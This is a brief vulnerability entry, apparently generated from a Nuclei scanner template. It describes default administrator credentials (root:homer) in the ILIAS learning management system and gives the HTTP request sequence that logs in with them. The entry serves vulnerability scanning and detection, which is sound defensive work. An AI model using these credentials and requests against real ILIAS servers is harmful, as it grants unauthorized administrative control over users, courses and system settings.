# Vulnerability: ILIAS LMS - Default Admin Credentials
**Classification:** ILIAS
**Source:** Nuclei Template (`ilias-default-login.yaml`)

## Description
The ILIAS learning management system was found to be using default administrator credentials (root:homer). An attacker was able to gain full administrative access to manage courses, users, and system configuration.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /login.php HTTP/1.1
Host: {{Hostname}}

POST /ilias.php?baseClass=ilStartUpGUI&cmd=post&fallbackCmd=doStandardAuthentication&client_id={{client_id}} HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}&cmd%5BdoStandardAuthentication%5D=Login
```

